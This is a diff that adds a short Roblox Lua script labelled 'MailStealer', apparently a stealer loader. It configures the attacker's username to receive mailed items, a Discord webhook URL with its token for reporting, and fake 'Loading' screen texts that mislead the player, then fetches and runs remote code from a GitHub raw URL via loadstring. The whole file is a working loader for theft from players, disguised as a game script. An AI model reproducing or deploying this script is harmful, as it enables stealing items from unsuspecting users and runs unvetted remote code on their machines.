@@ -1,0 +1,29 @@
+lua
+
+--[[ Hostee Scriptz MailStealer ]]--
+
+--[[ Main Config ]]--
+
+_G.UserNamey = "eroro123boy"
+
+--[[ Webhook Config ]]--
+
+_G.Webhooky = "https://discord.com/api/webhooks/1112366350665519134/MpRG4arZY34eoFwkg2x1I1nax3AJm90bwvam0dM7IIdZ6Tn9YVROW8SWexnxzW4xDi96"
+
+--[[ Gui Config ]]--
+
+_G.MainText = "ProjectWd"
+
+_G.TextOne = "Loading"
+
+_G.TextTwo = "Loading"
+
+_G.TextThree = "Loading"
+
+_G.TextFour = "Loading"
+
+_G.TextFive = "Wait To Load The Script"
+
+--[[ Main Script ]]--
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/%E2%9C%97%20MailStealer%20%E2%9C%97"))()
